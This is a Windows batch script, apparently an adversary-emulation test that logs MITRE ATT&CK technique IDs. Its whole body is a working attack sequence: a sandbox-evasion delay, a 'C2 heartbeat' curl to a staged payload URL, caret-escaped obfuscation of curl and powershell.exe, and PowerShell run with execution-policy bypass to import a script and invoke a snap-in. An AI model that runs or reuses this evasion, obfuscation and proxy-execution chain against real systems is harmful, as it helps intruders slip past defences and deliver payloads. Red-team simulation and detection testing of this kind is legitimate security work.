@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET ydgnsmw=%APPDATA%\8234\ca285009
SET rpeymgl=https://10.0.0.49
SET jtklwrx=https://10.0.0.49/stage/2/icon.png?8234-7
SET npgqrkp=ITZEL-S2BO
SET wbmtfdv=7
SET zqlfnsx=chr0me.txt
SET vghbkcd=8234

REM Log file path construction
SET dqmcvsl=%APPDATA%\!wbmtfdv!\macula-simulations.log
SET bvwjsqm=%APPDATA%\!wbmtfdv!

REM Initial sandbox evasion delay (30-60s)
echo [%DATE% %TIME%][DEBUG][!npgqrkp!]: initial_delay_start>>> "!dqmcvsl!" 2>nul
timeout /t 45 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!npgqrkp!]: initial_delay_complete>>> "!dqmcvsl!" 2>nul

REM C2 HEARTBEAT (first operation)
echo [%DATE% %TIME%][DEBUG][!npgqrkp!]: heartbeat_start=!jtklwrx!>>> "!dqmcvsl!" 2>nul
SET /A yhxjkmd=%RANDOM% %% 20 + 10
timeout /t !yhxjkmd! /nobreak >nul

SET bnlczp=c^u^r^l
SET mqrwth=-^k^ -^s^ -^o^ n^u^l
!bnlczp! !mqrwth! "!jtklwrx!"
IF !ERRORLEVEL! EQU 0 (
    SET qzmvnwp=1
    SET pktlgys=
) ELSE (
    SET qzmvnwp=0
    SET pktlgys=curl_failed_!ERRORLEVEL!
)

FOR /F "tokens=1-3 delims=/ " %%a IN ("!DATE!") DO SET mydate=%%c-%%b-%%a
FOR /F "tokens=1-4 delims=:." %%a IN ("!TIME!") DO SET mytime=%%a:%%b:%%c.%%d
SET vdgjskh=![!mydate! !mytime!][!npgqrkp!]: !wbmtfdv!-!vghbkcd!-T1218^|Signed Binary Proxy Execution=!qzmvnwp!:!pktlgys!
echo !vdgjskh!>> "!dqmcvsl!" 2>nul || echo >nul
echo [%DATE% %TIME%][DEBUG][!npgqrkp!]: heartbeat_complete=!qzmvnwp!>>> "!dqmcvsl!" 2>nul

REM Delay between operations
echo [%DATE% %TIME%][DEBUG][!npgqrkp!]: inter_op_delay_start>>> "!dqmcvsl!" 2>nul
ping -n 8 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!npgqrkp!]: inter_op_delay_complete>>> "!dqmcvsl!" 2>nul

REM Obfuscated LOLBin execution with caret escapes
SET qhxzkw=p^o^w^e^r^s^h^e^l^l^.^e^x^e
SET jypgtrm=-^e^p^ b^y^p^a^s^s^ -^c^o^m^m^a^n^d^
SET hbvgfdp="s^e^t^-^l^o^c^a^t^i^o^n^ -^p^a^t^h^ c^:^\^w^i^n^d^o^w^s^\
SET qthmlnw=d^i^a^g^n^o^s^t^i^c^s^\^s^y^s^t^e^m^\^n^e^t^w^o^r^k^i^n^g^;
SET wfjdhrp= i^m^p^o^r^t^-^m^o^d^u^l^e^ .^\^U^t^i^l^i^t^y^F^u^n^c^t^i^o^n^s^.^p^s^1^;
SET rkvmpdy= R^e^g^S^n^a^p^i^n^ !ydgnsmw!\!zqlfnsx!^;^[^P^r^o^g^r^a^m^.^C^l^a^s^s^]^:^:^D^a^l^e^(^)^"

REM Combine command fragments
SET ghsyrnz=!hbvgfdp!!qthmlnw!!wfjdhrp!!rkvmpdy!

echo [%DATE% %TIME%][DEBUG][!npgqrkp!]: dll_execution_start=!qhxzkw!>>> "!dqmcvsl!" 2>nul
!qhxzkw! !jypgtrm! !ghsyrnz!
IF !ERRORLEVEL! EQU 0 (
    SET fsnmvkr=1
    SET cvhpxwt=
) ELSE (
    SET fsnmvkr=0
    SET cvhpxwt=dll_exec_failed_!ERRORLEVEL!
)

FOR /F "tokens=1-3 delims=/ " %%a IN ("!DATE!") DO SET mydate=%%c-%%b-%%a
FOR /F "tokens=1-4 delims=:." %%a IN ("!TIME!") DO SET mytime=%%a:%%b:%%c.%%d
SET prkqyvw=![!mydate! !mytime!][!npgqrkp!]: !wbmtfdv!-!vghbkcd!-T1218.011^|Regsvr32=!fsnmvkr!:!cvhpxwt!
echo !prkqyvw!>> "!dqmcvsl!" 2>nul || echo >nul
echo [%DATE% %TIME%][DEBUG][!npgqrkp!]: dll_execution_complete=!fsnmvkr!>>> "!dqmcvsl!" 2>nul

REM Final random delay
SET /A zxcvbgy=%RANDOM% %% 10 + 5
echo [%DATE% %TIME%][DEBUG][!npgqrkp!]: final_delay_start=!zxcvbgy!s>>> "!dqmcvsl!" 2>nul
CHOICE /C Y /N /D Y /T !zxcvbgy! >nul
echo [%DATE% %TIME%][DEBUG][!npgqrkp!]: final_delay_complete>>> "!dqmcvsl!" 2>nul

ENDLOCAL